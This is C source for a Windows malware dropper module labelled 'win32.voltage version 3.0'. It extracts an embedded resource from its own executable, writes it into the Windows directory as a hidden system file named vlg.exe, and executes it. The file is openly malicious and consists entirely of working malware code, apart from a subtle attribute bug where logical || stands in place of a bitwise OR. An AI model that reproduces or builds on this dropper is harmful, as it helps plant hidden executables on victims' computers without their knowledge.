   #include "stdafx.h"

   //that module drop win32.voltage version 3.0 & execute it


   DWORD WINAPI DropVoltage(LPVOID xvoid)
   {
       HRSRC xvar_res;
       HMODULE xdropper_module;
       DWORD xvar_size,dummy;
       HGLOBAL xvar_data;
       char varFullPath[MAX_PATH];
       LPVOID xvar_xdata;
       HANDLE hfile;

       xdropper_module=GetModuleHandle(NULL);

       if(xdropper_module==NULL)
           ExitProcess(1);

       xvar_res=FindResource(NULL,"#105","Voltage");

       if(xvar_res!=NULL)
       {
           xvar_size=SizeofResource(xdropper_module,xvar_res);
           if(xvar_size!=0)
           {
               xvar_data=LoadResource(xdropper_module,xvar_res);

               if(xvar_data!=NULL)
               {
                   xvar_xdata=LockResource(xvar_data);

                   if(xvar_xdata!=NULL)
                   {
                       GetWindowsDirectory(varFullPath,MAX_PATH);

                       lstrcat(varFullPath,"\\vlg.exe");   //build full var path

                       hfile=CreateFile(varFullPath,GENERIC_WRITE,0,NULL,
                           CREATE_ALWAYS,FILE_ATTRIBUTE_SYSTEM || FILE_ATTRIBUTE_HIDDEN,NULL);

                       if(hfile!=INVALID_HANDLE_VALUE)
                       {
                           WriteFile(hfile,xvar_xdata,xvar_size,&dummy,NULL);
                           CloseHandle(hfile);

                           Sleep(2500);

                           WinExec(varFullPath,1);
                       }
                   }
               }
           }
       }

       return 1;
   }
